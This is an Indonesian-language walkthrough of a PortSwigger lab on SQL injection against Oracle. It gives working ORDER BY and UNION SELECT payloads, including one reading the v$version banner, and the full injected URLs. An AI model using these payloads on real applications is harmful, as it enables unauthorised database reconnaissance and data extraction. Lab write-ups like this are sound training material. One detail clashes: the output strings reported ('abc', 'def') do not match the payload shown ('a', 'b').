# Soal - SQL injection attack, querying the database type and version on Oracle  

Source soal : https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle  

## Deskripsi Soal 
Melakukan serangan SQL Injection UNION untuk mengidentifikasi tipe dan versi database yang digunakan. Petunjuk dari judul lab secara eksplisit menyatakan bahwa database yang digunakan adalah Oracle.
Tujuannya adalah menyuntikkan query melalui filter kategori produk untuk mengekstrak informasi versi dari tabel sistem Oracle dan menampilkannya di halaman

## Penyelesaian 
1. Akses lab dan mengklik salah satu filter kategori, yaitu Gifts untuk mengamati URL. URL yang terlihat adalah `https://0a0b008a04d321288082178e004600be.web-security-academy.net/filter?category=Gifts`      
<img width="1527" height="591" alt="image" src="https://github.com/user-attachments/assets/16ef642e-1aad-46ae-87e3-19ac54be86f6" />  

2. Untuk mengetahui berapa banyak kolom yang diambil oleh query asli dapat menambahkan payload `' ORDER BY 1 --` agka 1 bisa diubah menjadi angka lain  
<img width="1674" height="731" alt="image" src="https://github.com/user-attachments/assets/587d3b53-184a-4bf8-b8f4-b16379fa9325" />  
<img width="1536" height="727" alt="image" src="https://github.com/user-attachments/assets/bd10131b-b3a3-4d72-a136-e766eb62fc1e" />  
<img width="1585" height="382" alt="image" src="https://github.com/user-attachments/assets/175e394f-8e72-4b12-b40f-c9b608a275e6" />  
Ternyata pada `'ORDER BY 3 --` terjadi internal error, yang menunjukkan bahwa query asli mengambil 2 kolom

3. Untuk mengetahui kolom mana yang bisa menampilkan data string pada Oracle, SELECT dalam UNION harus memiliki klausa FROM. Tabel dual adalah tabel dummy bawaan di Oracle yang bisa disuntikkan payload `' UNION SELECT 'a','b' FROM dual --` sehingga URL akan berubah menjadi `https://0a0b008a04d321288082178e004600be.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20%27a%27,%27b%27%20FROM%20dual--`
<img width="1551" height="597" alt="image" src="https://github.com/user-attachments/assets/0734f5ce-3328-49ba-a204-c04a36ab22ad" />  
Hasilnya, teks "abc" dan "def" muncul di halaman di tempat nama dan deskripsi produk. Ini mengonfirmasi bahwa kedua kolom dapat menerima tipe data string

4. Untuk Oracle, informasi versi disimpan dalam view v$version di dalam kolom yang disebut banner.
- Membuat payload untuk mengambil banner dan menempatkan NULL di kolom kedua
- Payload Final: `' UNION SELECT banner, NULL FROM v$version--`
- URL modifikasi : `https://0a0b008a04d321288082178e004600be.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20banner,%20NULL%20FROM%20v$version--`  
<img width="1614" height="670" alt="image" src="https://github.com/user-attachments/assets/77c57502-7c9a-4503-acda-f8c96ba677f5" />  



## Hasil 
Berhasil menampilkan versi database Oracle   
> Serangan ini berhasil karena sintaks yang spesifik untuk database Oracle
> - Menggunakan ORDER BY untuk enumerasi kolom
> - Penggunaan tabel dual (FROM dual) wajib ada dalam sintaks SELECT di Oracle
> - Mengetahui tabel sistem v$version dan kolom banner untuk mengekstrak informasi yang diminta
